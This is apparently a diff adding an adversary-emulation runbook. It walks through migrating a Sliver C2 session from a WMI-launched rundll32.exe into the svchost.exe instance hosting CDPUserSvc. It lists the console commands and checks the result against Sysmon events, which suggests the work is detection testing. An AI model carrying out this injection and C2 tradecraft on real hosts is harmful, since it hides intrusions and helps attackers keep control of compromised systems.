@@ -1,0 +1,28 @@
+Migration into the CDPUserSvc service host (backup server)
+
+Preconditions
+  - WMI-created rundll32.exe has loaded C:\ProgramData\143.dll and registered a session
+  - the session is selected in the Sliver console
+  - the account running the target instance is the interactive user, so no privilege step is needed
+
+Sequence
+
+  sessions
+  ps -e | grep "UnistackSvcGroup"     # one instance: svchost.exe -k UnistackSvcGroup -s CDPUserSvc
+  migrate --pid <pid>
+  sessions
+  use <new-session-id>
+  whoami                              # the logged-on user, not SYSTEM
+  execute -o cmd.exe /c "ipconfig /all"
+
+Why by PID
+  Several svchost.exe instances run on the host. Migrating by name can land in an arbitrary
+  instance, which changes both the process tree and the network attribution. The PID of the
+  instance whose command line contains `-k UnistackSvcGroup -s CDPUserSvc` is the correct target.
+
+Verification gates
+
+  E8 target image ................ svchost.exe
+  E8 source image ................ rundll32.exe
+  callback source ................ svchost.exe (Sysmon E3)
+  rundll32 session still alive ... yes, retained for the WmiPrvSE -> rundll32 evidence
